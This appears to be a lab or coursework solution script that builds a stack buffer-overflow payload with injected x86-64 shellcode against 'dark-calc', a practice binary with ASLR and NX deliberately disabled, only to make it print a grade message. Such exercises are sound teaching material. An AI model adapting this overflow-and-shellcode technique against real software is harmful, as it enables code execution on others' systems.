#!/usr/bin/env python3
"""Task 2: stack-execution shellcode for attack/dark-calc.

dark-calc deliberately disables both modern defences for this task
("楚门的世界" / the Truman show): init_fixed_stack() mmaps a fixed region at
0x721000000000 with RWX permissions and points the stack at the fixed address
fixed_stack_top = 0x721000801000, so ASLR and NX are both bypassed.

We overflow input()'s 16-byte expression buffer and overwrite the saved return
address with the address of our own machine code, which we place on that fixed,
executable stack. The shellcode sets rdi=4 and calls grade_eval(4) to print
"Hope A will be your grade!".

Stack layout (fixed):
    fixed_stack_top    0x721000801000  (guard page just above this)
    shellcode          0x721000800ff0  (16 bytes below the guard page)
    return address     0x721000800fe8
    saved rbp          0x721000800fe0
    expression         0x721000800fd0
"""
import struct
import sys

SHELLCODE_ADDR = 0x721000800FF0   # expression + 0x20, on the RWX stack

# mov edi, 4 ; mov eax, grade_eval ; call rax
#   mov eax, imm32 zero-extends into rax, so rax == 0x401a87
#   call rax pushes an 8-byte return address, which also happens to realign the
#   stack (grade_eval calls printf, whose movaps needs a 16-byte-aligned rsp)
shellcode  = b"\xbf\x04\x00\x00\x00"   # mov edi, 4
shellcode += b"\xb8\x87\x1a\x40\x00"   # mov eax, 0x401a87   (grade_eval)
shellcode += b"\xff\xd0"               # call rax

payload = b"A" * 16                             # expression buffer (16 bytes)
payload += b"B" * 8                             # overwrite saved rbp
payload += struct.pack("<Q", SHELLCODE_ADDR)    # return address -> shellcode
payload += shellcode                            # shellcode on the stack

sys.stdout.buffer.write(payload + b"\n")
